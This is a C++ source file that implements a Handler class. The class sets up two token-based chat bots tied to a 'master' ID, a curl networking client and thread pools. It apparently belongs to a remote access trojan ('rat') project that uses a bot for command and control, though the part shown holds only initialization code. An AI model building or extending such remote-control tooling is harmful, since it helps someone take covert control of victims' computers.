#include "rat/Handler.hpp"
#include "rat/ThreadPool.hpp"
#include "rat/tbot/tbot.hpp"
#include <memory>

namespace rat::handler {

void Handler::setMasterId(const uint64_t Master_Id) {
    this->master_id = Master_Id;
}

void Handler::initMainBot(const char* arg_Token) {
    this->bot = std::make_unique<::rat::tbot::Bot>(arg_Token, this->master_id);
    this->bot->sendMessage("This Bot has been initialized");
    this->bot->setOffset();
}

void Handler::initBackingBot(const char* arg_Token) {
    this->backing_bot = std::make_unique<::rat::tbot::BaseBot>(arg_Token, this->master_id);
    this->backing_bot->sendMessage("This Bot has been initialized");
}

void Handler::initCurlClient(uint8_t Operation_Restart_Bound) {
    this->curl_client = std::make_unique<::rat::networking::Client>(Operation_Restart_Bound);
    this->bot->sendMessage("Handler's Curl client has been initialized");
}
void Handler::initThreadPools(uint8_t Number_Long_Process_Threads, uint8_t Number_Short_Process_Threads) {
    this->long_process_pool = std::make_unique<::rat::threading::ThreadPool>(Number_Long_Process_Threads);
    this->short_process_pool = std::make_unique<::rat::threading::ThreadPool>(Number_Short_Process_Threads);
}
}//rat::handler
